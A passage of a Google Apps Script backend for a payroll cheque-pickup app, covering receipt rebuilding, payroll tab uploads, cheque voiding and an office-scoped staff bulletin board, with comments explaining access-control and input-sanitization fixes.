  var isNewFormat = String(headerRow[1]).trim() === 'Distributor';

  // Parse receipt metadata + raw stored cheque list
  var storedCheques = [];
  var receipt;
  if (isNewFormat) {
    try { storedCheques = JSON.parse(row[6] || '[]'); } catch(e) {}
    receipt = {
      receiptId: String(row[0]).trim(),
      distributor: String(row[1]).trim(),
      collector: String(row[2]).trim(),
      timestamp: String(row[3]).trim(),
      weekEnding: String(row[4]).trim(),
      photoUrl: String(row[5]).trim()
    };
  } else {
    try { storedCheques = JSON.parse(row[5] || '[]'); } catch(e) {}
    receipt = {
      receiptId: String(row[0]).trim(),
      distributor: '',
      collector: String(row[1]).trim(),
      timestamp: String(row[2]).trim(),
      weekEnding: String(row[3]).trim(),
      photoUrl: String(row[4]).trim()
    };
  }

  // --- Re-fetch cheque data live from source sheets ---
  // New receipts store locators:  { chqNo, sheetName, rowIndex }
  // Old receipts store full blobs: { chqNo, name, week, office, netPay, ... } — no sheetName/rowIndex
  //
  // Both are handled the same way: group by resolved sheetName, read each sheet once.
  // New format  → jump straight to rowIndex (fast).
  // Old format  → reconstruct sheetName from week+office, then scan for chqNo (still only one sheet read per tab).
  // If sheet is gone → fall back to stored data for old blobs, minimal stub for new locators.

  // Resolve a sheetName for every entry (old or new)
  var bySheet = {};
  storedCheques.forEach(function(c, idx) {
    // FIX: entries used to be keyed by chqNo alone. Cheque numbers are only
    // unique per office, so a batch spanning two offices with the same number
    // collapsed into one line — the receipt printed one employee twice and
    // dropped the other, with a total that was wrong by the difference.
    c._k = idx;
    var sName = c.sheetName;
    if (!sName && c.week && c.office) {
      // Old receipt: reconstruct from stored week + office fields
      sName = c.week.toUpperCase() + '_' + c.office;
    }
    if (!sName) {
      // No way to locate — keep stored data as-is
      if (!bySheet['__unresolvable__']) bySheet['__unresolvable__'] = [];
      bySheet['__unresolvable__'].push(c);
      return;
    }
    if (!bySheet[sName]) bySheet[sName] = [];
    bySheet[sName].push(c);
  });

  // Read each distinct sheet once and enrich all its entries
  var refetched = {};  // storedCheques index (_k) → enriched cheque object

  Object.keys(bySheet).forEach(function(sheetName) {
    if (sheetName === '__unresolvable__') return;

    var dataSheet = ss.getSheetByName(sheetName);
    if (!dataSheet) {
      // Sheet deleted — entries here will fall back to stored blob data below
      return;
    }

    var data = dataSheet.getDataRange().getValues();
    var colMap = detectColumns(data);
    if (!colMap) return;

    // Derive week and office from sheetName (e.g. "WE0207_Cambridge")
    var underIdx = sheetName.indexOf('_');
    var week   = underIdx !== -1 ? sheetName.substring(0, underIdx).toUpperCase() : '';
    var office = underIdx !== -1 ? normalizeOffice(sheetName.substring(underIdx + 1)) : sheetName;

    // Build a chqNo → rowIndex lookup from the full sheet for old-format entries
    var chqIndex = {};  // chqNo → row index (only built when needed)
    var chqIndexBuilt = false;

    function findByChqNo_(wanted) {
      if (!chqIndexBuilt) {
        for (var ri2 = colMap.headerRow + 1; ri2 < data.length; ri2++) {
          var cn = String(data[ri2][colMap.chqNo] || '').trim();
          if (cn) chqIndex[cn] = ri2;
        }
        chqIndexBuilt = true;
      }
      return chqIndex[String(wanted).trim()];
    }

    bySheet[sheetName].forEach(function(entry) {
      var r = null;
      var wantChq = entry.chqNo !== undefined && entry.chqNo !== null ? String(entry.chqNo).trim() : '';

      if (entry.rowIndex !== undefined) {
        // New format: jump directly to the stored row index...
        var ri = entry.rowIndex;
        if (ri >= colMap.headerRow + 1 && ri < data.length) {
          // FIX: ...but verify the row still holds the cheque we recorded. Row
          // indexes are positional; sorting or inserting rows in a payroll tab
          // used to make every historical receipt for that week silently render
          // different employees and a different total — including through the
          // public QR link the employee is holding.
          var rowChq = String(data[ri][colMap.chqNo] || '').trim();
          if (!wantChq || rowChq === wantChq) r = data[ri];
        }
        if (!r && wantChq) {
          // Row moved — fall back to locating it by cheque number.
          var moved = findByChqNo_(wantChq);
          if (moved !== undefined) r = data[moved];
        }
        if (!r) return;
      } else {
        // Old format: find the row by scanning for matching chqNo
        var foundRow = findByChqNo_(wantChq);
        if (foundRow === undefined) return;
        r = data[foundRow];
      }

      var lastName  = String(r[colMap.lastName] || '').trim();
      var firstName = colMap.firstName !== undefined ? String(r[colMap.firstName] || '').trim() : '';
      var client    = colMap.client    !== undefined ? String(r[colMap.client]    || '').trim() : '';
      var chqNo     = String(r[colMap.chqNo] || '').trim();
      var netPay    = parseFloat(r[colMap.netPay])  || 0;
      var payRate   = colMap.payRate !== undefined ? (parseFloat(r[colMap.payRate])  || 0) : 0;
      var hours     = colMap.hours   !== undefined ? (parseFloat(r[colMap.hours])    || 0) : 0;
      var empNo     = colMap.empNo   !== undefined ? String(r[colMap.empNo]  || '').trim() : '';
      var jigId     = colMap.jigId   !== undefined ? String(r[colMap.jigId]  || '').trim() : '';

      refetched[entry._k] = {
        chqNo: chqNo || entry.chqNo,
        name: lastName + ' ' + firstName,
        client: client,
        week: week,
        office: office,
        payRate: payRate,
        hours: hours,
        empNo: empNo,
        jigId: jigId,
        netPay: netPay
      };
    });
  });

  // Assemble final cheque list
  var cheques = [];
  storedCheques.forEach(function(entry) {
    if (refetched[entry._k]) {
      // Successfully re-fetched from sheet — always prefer live data
      cheques.push(refetched[entry._k]);
    } else if (entry.name || entry.netPay) {
      // Old receipt whose sheet is gone — return stored blob so receipt still renders
      cheques.push(entry);
    } else {
      // New-format locator whose sheet is gone — minimal stub
      cheques.push({ chqNo: entry.chqNo, name: '', client: '', week: '', office: '', payRate: 0, hours: 0, empNo: '', jigId: '', netPay: 0 });
    }
  });

  // Filter out $0 entries — these are payroll records with no actual cheque
  cheques = cheques.filter(function(ch) { return (parseFloat(ch.netPay) || 0) > 0; });

  // Sort by chqNo ascending for consistent receipt ordering
  cheques.sort(function(a, b) { return (parseInt(a.chqNo) || 0) - (parseInt(b.chqNo) || 0); });
  receipt.cheques = cheques;

  // FIX: the public QR endpoint returned the Drive photo URL in its JSON.
  // Employees scanning a receipt need the line items, not an internal photo link.
  if (!user) receipt.photoUrl = '';

  // Access control: check user can see at least one cheque's office
  if (user && !user.allOffices) {
    var hasAccess = false;
    for (var j = 0; j < cheques.length; j++) {
      var cOffice = String(cheques[j].office || '').trim();
      var cClient = String(cheques[j].client || '').trim();
      if (userCanAccessOffice(user, cOffice) || userHasClientAccess(user, cClient)) { hasAccess = true; break; }
    }
    // Fallback: distributor/collector match grants access (covers deleted-sheet case)
    if (!hasAccess) hasAccess = (receipt.distributor === user.name || receipt.collector === user.name);
    if (!hasAccess) return { error: 'Access denied' };
  }

  return receipt;
}

// ---- UPDATE COMMENT ----

function updateComment(data, user) {
  if (!data.sheetName || data.rowIndex === undefined) return { error: 'Missing parameters' };

  var sv = validateSheet(data.sheetName, user);
  if (sv.error) return { error: sv.error };

  if (sv.colMap.comments === undefined) return { error: 'No comments column found in: ' + data.sheetName };

  // FIX: this was the only write path not passing expectedChqNo. rowIndex is
  // positional and captured at search time, so if a row was inserted or the tab
  // was sorted in between, the comment — which is also the HOLD mechanism —
  // landed on a different employee's cheque and still returned {ok:true}.
  var rv = validateChequeRow(sv.data, sv.colMap, data.rowIndex, user, sv.hasOfficeAccess, data.chqNo);
  if (rv.error) return { error: rv.error };

  try {
    var cell = sv.sheet.getRange(data.rowIndex + 1, sv.colMap.comments + 1);
    var text = String(data.comment || '').trim();
    cell.setValue(sanitizeCell_(text));
    return { ok: true, comment: text };
  } catch (err) {
    return { error: err.toString() };
  }
}

// ---- UPLOAD PAYROLL ----

function uploadPayroll(data, user) {
  if (user.role !== 'admin') return { error: 'Only admins can upload payroll' };
  if (!data.weekEnding || !data.sheets || data.sheets.length === 0) return { error: 'Invalid upload data' };

  // FIX: the week code was never validated here, but every reader enforces
  // /^WE\d{4}$/. A typed "WE 0214" created tabs that were permanently invisible
  // to the whole application while sitting in the spreadsheet — and the upload
  // reported "3 tabs created".
  var weekEnding = String(data.weekEnding).toUpperCase().trim();
  if (!/^WE\d{4}$/.test(weekEnding)) {
    return { error: 'Invalid week code "' + data.weekEnding + '" — must look like WE0214 (WE followed by 4 digits, no spaces).' };
  }

  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var created = 0, errors = [], createdTabs = [], skippedTabs = [];

  for (var s = 0; s < data.sheets.length; s++) {
    var sheetData = data.sheets[s];

    // FIX: worksheet names came straight from the uploaded workbook and ended up
    // inside the uid the frontend writes into data-uid attributes. Constrain
    // them so a hostile or malformed tab name cannot break out.
    var officeName = String(sheetData.name || '').trim();
    if (!/^[A-Za-z0-9 ._&()-]{1,40}$/.test(officeName)) {
      errors.push('"' + officeName + '": invalid worksheet name — use letters, digits, spaces and . _ & ( ) - only (max 40 chars)');
      continue;
    }

    var tabName = weekEnding + '_' + officeName;

    if (ss.getSheetByName(tabName)) { skippedTabs.push(tabName); continue; }

    var sheet = null;
    try {
      sheet = ss.insertSheet(tabName);
      var rows = sheetData.rows;
      if (rows.length > 0) {
        var maxCols = 0;
        for (var r = 0; r < rows.length; r++) {
          if (rows[r].length > maxCols) maxCols = rows[r].length;
        }
        for (var r2 = 0; r2 < rows.length; r2++) {
          while (rows[r2].length < maxCols) rows[r2].push('');
        }
        // FIX: a hostile or malformed .xlsx could plant live formulas here.
        var safeRows = rows.map(sanitizeRow_);
        sheet.getRange(1, 1, safeRows.length, maxCols).setValues(safeRows);
      }
      created++;
      createdTabs.push(tabName);
    } catch (err) {
      // FIX: insertSheet and setValues are separate operations. A failure between
      // them used to leave an empty tab, which the retry path then SKIPPED as
      // "already exists" — permanently. Roll it back so a retry can succeed.
      if (sheet) {
        try { ss.deleteSheet(sheet); } catch (e2) { /* leave it; reported below */ }
      }
      errors.push(tabName + ': ' + err.toString());
    }
  }

  var skipped = skippedTabs.length;
  var parts = [];
  if (created > 0) parts.push(created + ' tab' + (created !== 1 ? 's' : '') + ' created');
  if (skipped > 0) parts.push(skipped + ' already existed and ' + (skipped !== 1 ? 'were' : 'was') + ' NOT updated');
  if (errors.length > 0) parts.push(errors.length + ' failed');

  // FIX: this used to always return ok:true with no top-level error, so the UI
  // showed a green tick even when every tab failed or nothing was written at all.
  var result = {
    created: created, skipped: skipped, errors: errors,
    createdTabs: createdTabs, skippedTabs: skippedTabs,
    weekEnding: weekEnding,
    message: parts.length ? parts.join(', ') : 'Nothing to do'
  };

  if (created === 0 && errors.length > 0) {
    result.error = 'Upload failed — no tabs were created. ' + errors.join(' | ');
    return result;
  }
  result.ok = true;
  // Partial or no-op outcomes the admin must see rather than a plain success tick.
  result.warning = (created === 0 && skipped > 0)
    ? 'Nothing was written. ' + skipped + ' tab(s) for ' + weekEnding + ' already exist and are never overwritten, '
      + 'so corrections in this file have NOT been applied. To re-import a week, delete the existing tab(s) in Google Sheets first — '
      + 'note that deleting a tab also deletes any pickup signatures recorded against it.'
    : (errors.length > 0 ? errors.length + ' tab(s) failed: ' + errors.join(' | ') : '');
  return result;
}

// ---- VOID CHEQUES ----

function voidCheques(data, user) {
  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var results = [];
  var receiptId = data.receiptId || ('V-' + new Date().getTime());
  var voidedBy = (user && user.name) ? user.name : '';

  var sigText = 'VOIDED by ' + voidedBy + ' \u2014 ' + data.timestamp + ' [' + receiptId + ']';

  var anySuccess = false;
  var alreadyCollected = [];
  var writtenLocators = [];

  var lock = LockService.getScriptLock();
  try { lock.waitLock(15000); }
  catch (e) { return { error: 'Server busy — please try again in a moment', results: [] }; }

  try {
    var sheetCache = {};

    for (var i = 0; i < data.cheques.length; i++) {
      var c = data.cheques[i];

      if (!sheetCache[c.sheetName]) sheetCache[c.sheetName] = validateSheet(c.sheetName, user);
      var sv = sheetCache[c.sheetName];
      if (sv.error) { results.push({ uid: c.uid, error: sv.error }); continue; }

      var rv = validateChequeRow(sv.data, sv.colMap, c.rowIndex, user, sv.hasOfficeAccess, c.chqNo);
      if (rv.error) { results.push({ uid: c.uid, error: rv.error }); continue; }

      var cell = sv.sheet.getRange(c.rowIndex + 1, sv.colMap.signature + 1);
      var currentVal = String(cell.getValue() || '').trim();

      if (currentVal.length > 0) {
        results.push({ uid: c.uid, error: 'Already collected/voided', signature: currentVal });
        alreadyCollected.push({ uid: c.uid, chqNo: rv.chqNo || '' });
        continue;
      }

      cell.setValue(sigText);
      results.push({ uid: c.uid, ok: true });
      // FIX: locators for voided cheques only — see the note in confirmPickup.
      writtenLocators.push({ chqNo: rv.chqNo || c.chqNo, sheetName: c.sheetName, rowIndex: c.rowIndex });
      anySuccess = true;
    }
    SpreadsheetApp.flush();
  } finally {
    lock.releaseLock();
  }

  var photo = anySuccess ? uploadPhoto_(data.photoBase64, data.photoFilename, data.weekEnding) : { url: '', error: '' };

  var receiptWritten = false;
  if (anySuccess) {
    receiptWritten = writeReceiptRow_(ss, receiptId, voidedBy, 'VOID', data.timestamp, data.weekEnding, photo.url, writtenLocators);
  }

  return {
    results: results, receiptId: receiptId, photoUrl: photo.url, photoError: photo.error,
    alreadyCollected: alreadyCollected, receiptWritten: receiptWritten
  };
}

// =============================================
// POSTS / BULLETIN BOARD
// =============================================
// Column layout for _Posts sheet:
// 0:ID  1:Type  2:Author  3:AuthorPIN  4:Offices
// 5:EmployeeName  6:Phone  7:ChqNo  8:EmpNo  9:JigId  10:Client  11:Week  12:Hours  13:Message
// 14:Timestamp  15:Resolved  16:ResolvedBy  17:ResolvedAt  18:Comments

function getOrCreatePostsSheet_() {
  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var sheet = ss.getSheetByName('_Posts');
  if (!sheet) {
    sheet = ss.insertSheet('_Posts');
    sheet.appendRow([
      'ID','Type','Author','AuthorPIN','Offices',
      'EmployeeName','Phone','ChqNo','EmpNo','JigId','Client','Week','Hours','Message',
      'Timestamp','Resolved','ResolvedBy','ResolvedAt','Comments'
    ]);
    sheet.setFrozenRows(1);
  }
  return sheet;
}

// Helper: detect _Posts layout version from header row
function detectPostsLayout_(header) {
  var h6 = String(header[6] || '').trim().toLowerCase();
  var h8 = String(header[8] || '').trim().toLowerCase();
  if (h6 === 'phone' && h8 === 'empno') return { v: 3, resolved: 15, resolvedBy: 16, resolvedAt: 17, comments: 18 };
  if (h6 === 'phone') return { v: 2, resolved: 13, resolvedBy: 14, resolvedAt: 15, comments: 16 };
  return { v: 1, resolved: 11, resolvedBy: 12, resolvedAt: 13, comments: 14 };
}

// ── Get posts (filtered by user's offices) ──

// Shared post visibility test.
// FIX: this used to be inline in handleGetPosts only, so resolve and comment had
// no office check at all. Also fixes a fail-open bug: 'Toronto,'.split(',') gives
// ['Toronto', ''] and uo.indexOf('') returns 0, which made any post with a
// trailing comma or a blank Offices cell visible to every office. Empty tokens
// are now dropped, and a post with no office scope at all is treated as
// company-wide (the documented default) rather than accidentally so.
function postVisibleToUser_(officesCsv, user) {
  if (!user) return false;
  if (user.allOffices || user.role === 'admin') return true;

  var postOffices = String(officesCsv || '').split(',')
    .map(function(s){ return s.trim(); })
    .filter(function(s){ return s.length > 0; });

  if (postOffices.length === 0) return true; // no scope recorded == all offices

  var userOffices = (user.offices || [])
    .map(function(o){ return String(o).trim().toLowerCase(); })
    .filter(function(o){ return o.length > 0; });

  return postOffices.some(function(po) {
    var p = po.toLowerCase();
    if (p === 'all offices') return true;
    return userOffices.some(function(uo) {
      return p.indexOf(uo) !== -1 || uo.indexOf(p) !== -1;
    });
  });
}

function handleGetPosts(data, user) {
  var sheet = getOrCreatePostsSheet_();
  var rows = sheet.getDataRange().getValues();
  if (rows.length <= 1) return { posts: [] };

  var layout = detectPostsLayout_(rows[0]);
  // FIX: PINs are the sole credential and were being serialized into every
  // getPosts response (visible in DevTools on any staff device). Ownership is
  // now computed server-side as isOwn; PINs never leave the sheet.
  var reqPin = String(data.pin);

  var posts = [];
  for (var i = 1; i < rows.length; i++) {
    var row = rows[i];
    var postOffices = String(row[4] || '').split(',')
      .map(function(s){ return s.trim(); })
      .filter(function(s){ return s.length > 0; });

    // NOTE: the old client-access branch here duplicated a condition already
    // tested in the .some() above, so it could never change the outcome. Dropped
    // rather than reimplemented — grant client users office access in _Users if
    // they need to see another office's board.
    if (!postVisibleToUser_(row[4], user)) continue;

    var comments = [];
    try { comments = JSON.parse(row[layout.comments] || '[]'); } catch(e) { comments = []; }
    comments = comments.map(function(cm) {
      return {
        id: cm.id, author: cm.author, text: cm.text, timestamp: cm.timestamp,
        isOwn: String(cm.authorPIN) === reqPin
      };
    });

    var post;
    if (layout.v === 3) {
      post = {
        id: row[0], type: row[1], author: row[2], isOwn: String(row[3]) === reqPin, offices: postOffices,
        employeeName: row[5] || '', phone: row[6] || '', chqNo: String(row[7] || ''),
        empNo: String(row[8] || ''), jigId: String(row[9] || ''),
        client: row[10] || '', week: row[11] || '', hours: row[12] || '', message: row[13] || '',
        timestamp: row[14] || '', resolved: row[layout.resolved] === true || row[layout.resolved] === 'TRUE',
        resolvedBy: row[layout.resolvedBy] || '', resolvedAt: row[layout.resolvedAt] || '', comments: comments
      };
    } else if (layout.v === 2) {
      post = {
        id: row[0], type: row[1], author: row[2], isOwn: String(row[3]) === reqPin, offices: postOffices,
        employeeName: row[5] || '', phone: row[6] || '', chqNo: String(row[7] || ''),
        empNo: '', jigId: '',
        client: row[8] || '', week: row[9] || '', hours: row[10] || '', message: row[11] || '',
        timestamp: row[12] || '', resolved: row[layout.resolved] === true || row[layout.resolved] === 'TRUE',
        resolvedBy: row[layout.resolvedBy] || '', resolvedAt: row[layout.resolvedAt] || '', comments: comments
      };
    } else {
      post = {
        id: row[0], type: row[1], author: row[2], isOwn: String(row[3]) === reqPin, offices: postOffices,
        employeeName: row[5] || '', phone: '', chqNo: '', empNo: '', jigId: '',
        client: row[6] || '', week: row[7] || '', hours: row[8] || '', message: row[9] || '',
        timestamp: row[10] || '', resolved: row[layout.resolved] === true || row[layout.resolved] === 'TRUE',
        resolvedBy: row[layout.resolvedBy] || '', resolvedAt: row[layout.resolvedAt] || '', comments: comments
      };
    }

    posts.push(post);
  }

  posts.sort(function(a,b) { return new Date(b.timestamp) - new Date(a.timestamp); });
  return { posts: posts };
}

// ── Create post ──

function handleCreatePost(data, user) {
  var sheet = getOrCreatePostsSheet_();

  var header = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  var layout = detectPostsLayout_(header);

  // Upgrade empty sheet to latest layout
  if (layout.v < 3 && sheet.getLastRow() <= 1) {
    sheet.getRange(1, 1, 1, 19).setValues([[
      'ID','Type','Author','AuthorPIN','Offices',
      'EmployeeName','Phone','ChqNo','EmpNo','JigId','Client','Week','Hours','Message',
      'Timestamp','Resolved','ResolvedBy','ResolvedAt','Comments'
    ]]);
    layout = { v: 3, resolved: 15, resolvedBy: 16, resolvedAt: 17, comments: 18 };
  }

  var id = 'P-' + new Date().getTime();
  var timestamp = new Date().toISOString();

  // FIX: the client fully controlled the post's office scope — a single-office
  // staff member could broadcast into offices they cannot read. The UI filters
  // the chips, but that is cosmetic. Enforce it here, and type-check the field
  // (a bare string used to throw on .join and leak the raw error to the caller).
  var requested = data.offices;
  if (!Array.isArray(requested)) requested = requested ? [String(requested)] : [];
  requested = requested.map(function(o){ return String(o).trim(); })
                       .filter(function(o){ return o.length > 0; });
  if (requested.length === 0) requested = ['All Offices'];

  if (!user.allOffices && user.role !== 'admin') {
    requested = requested.filter(function(o) { return postVisibleToUser_(o, user); });
    // Nothing the user may post to — scope it to their own offices instead of
    // silently widening to company-wide.
    if (requested.length === 0) {
      requested = (user.offices || []).slice();
      if (requested.length === 0) return { error: 'You have no office assigned — cannot post' };
    }
  }
  var offices = requested.join(',');

  // FIX: every field below is client-supplied and was appended raw. A leading
  // '=' would have been stored as a live formula. See sanitizeCell_.
  if (layout.v === 3) {
    sheet.appendRow(sanitizeRow_([
      id, data.type || 'broadcast', user.name, String(data.pin), offices,
      data.employeeName || '', data.phone || '', data.chqNo || '',
      data.empNo || '', data.jigId || '',
      data.client || '', data.week || '', data.hours || '', data.message || '',
      timestamp, false, '', '', '[]'
    ]));
  } else if (layout.v === 2) {
    sheet.appendRow(sanitizeRow_([
      id, data.type || 'broadcast', user.name, String(data.pin), offices,
      data.employeeName || '', data.phone || '', data.chqNo || '',
      data.client || '', data.week || '', data.hours || '', data.message || '',
      timestamp, false, '', '', '[]'
    ]));
  } else {
    sheet.appendRow(sanitizeRow_([
      id, data.type || 'broadcast', user.name, String(data.pin), offices,
      data.employeeName || '', data.client || '', data.week || '',
      data.hours || '', data.message || '',
      timestamp, false, '', '', '[]'
    ]));
  }

  return { id: id, author: user.name, timestamp: timestamp, offices: requested };
}

// ── Resolve post ──

function handleResolvePost(data, user) {
  var sheet = getOrCreatePostsSheet_();
  var rows = sheet.getDataRange().getValues();
  var layout = detectPostsLayout_(rows[0]);

  for (var i = 1; i < rows.length; i++) {
    if (rows[i][0] === data.postId) {
      // FIX: this had no author check and no office check — unlike delete, which
      // has both. Any authenticated user could resolve any post in any office.
      // Resolved posts drop out of the default board view and are then deleted
      // permanently by cleanupResolvedPosts after 14 days, so this silently
      // destroyed other offices' wage disputes.
      if (!postVisibleToUser_(rows[i][4], user)) {
        return { error: 'Post not found' };
      }
      if (String(rows[i][3]) !== String(data.pin) && user.role !== 'admin') {
        return { error: 'Only the author or an admin can resolve this post' };
      }
      var now = new Date().toISOString();
      sheet.getRange(i + 1, layout.resolved + 1).setValue(true);
      sheet.getRange(i + 1, layout.resolvedBy + 1).setValue(sanitizeCell_(user.name));
      sheet.getRange(i + 1, layout.resolvedAt + 1).setValue(now);
      return { resolved: true, resolvedBy: user.name, resolvedAt: now };
    }
  }
  return { error: 'Post not found' };
}

// ── Delete post (own posts or admin) ──

function handleDeletePost(data, user) {
  var sheet = getOrCreatePostsSheet_();
  var rows = sheet.getDataRange().getValues();

  for (var i = 1; i < rows.length; i++) {
    if (rows[i][0] === data.postId) {
      if (String(rows[i][3]) !== String(data.pin) && user.role !== 'admin') {
        return { error: 'You can only delete your own posts' };
      }
      sheet.deleteRow(i + 1);
      return { deleted: true };
    }
  }
  return { error: 'Post not found' };
}

// ── Add comment to post ──

function handleAddPostComment(data, user) {
  var sheet = getOrCreatePostsSheet_();
  var rows = sheet.getDataRange().getValues();
  var layout = detectPostsLayout_(rows[0]);

  for (var i = 1; i < rows.length; i++) {
    if (rows[i][0] === data.postId) {
      // FIX: no office check here either — any user could comment, under their
      // real name, on a post in an office they cannot see.
      if (!postVisibleToUser_(rows[i][4], user)) {
        return { error: 'Post not found' };
      }
      var comments = [];
      try { comments = JSON.parse(rows[i][layout.comments] || '[]'); } catch(e) { comments = []; }

      var comment = {
        id: 'C-' + new Date().getTime(),
        author: user.name,
        authorPIN: String(data.pin),
        text: data.text || '',
        timestamp: new Date().toISOString()
      };
      comments.push(comment);

      sheet.getRange(i + 1, layout.comments + 1).setValue(JSON.stringify(comments));
      // Sanitized echo — stored JSON keeps the PIN for ownership checks,
      // but it never goes back over the wire
      return { comment: { id: comment.id, author: comment.author, text: comment.text, timestamp: comment.timestamp, isOwn: true } };
    }
  }
  return { error: 'Post not found' };
}

// ── Delete comment from post (own comments or admin) ──

function handleDeletePostComment(data, user) {
  var sheet = getOrCreatePostsSheet_();
  var rows = sheet.getDataRange().getValues();
  var layout = detectPostsLayout_(rows[0]);

  for (var i = 1; i < rows.length; i++) {
    if (rows[i][0] === data.postId) {
      var comments = [];
      try { comments = JSON.parse(rows[i][layout.comments] || '[]'); } catch(e) { comments = []; }

      var idx = -1;
      for (var j = 0; j < comments.length; j++) {
        if (comments[j].id === data.commentId) { idx = j; break; }
      }
      if (idx === -1) return { error: 'Comment not found' };

      if (String(comments[idx].authorPIN) !== String(data.pin) && user.role !== 'admin') {
        return { error: 'You can only delete your own comments' };
      }

      comments.splice(idx, 1);
      sheet.getRange(i + 1, layout.comments + 1).setValue(JSON.stringify(comments));
      return { deleted: true };
    }
  }
  return { error: 'Post not found' };
}

// ── Auto-cleanup: delete resolved posts older than 14 days ──
// Set up as a daily time-trigger:
//   Triggers → Add Trigger → cleanupResolvedPosts → Time-driven → Day timer

function cleanupResolvedPosts() {
  var ss;
  try { ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID); } catch(e) { return; }
  var sheet = ss.getSheetByName('_Posts');
  if (!sheet) return;

  var rows = sheet.getDataRange().getValues();
  var layout = detectPostsLayout_(rows[0]);

  var cutoff = new Date();
  cutoff.setDate(cutoff.getDate() - 14);

  for (var i = rows.length - 1; i >= 1; i--) {
    if (rows[i][layout.resolved] === true || rows[i][layout.resolved] === 'TRUE') {
      var resolvedAt = new Date(rows[i][layout.resolvedAt]);
      if (resolvedAt < cutoff) sheet.deleteRow(i + 1);
    }
  }
}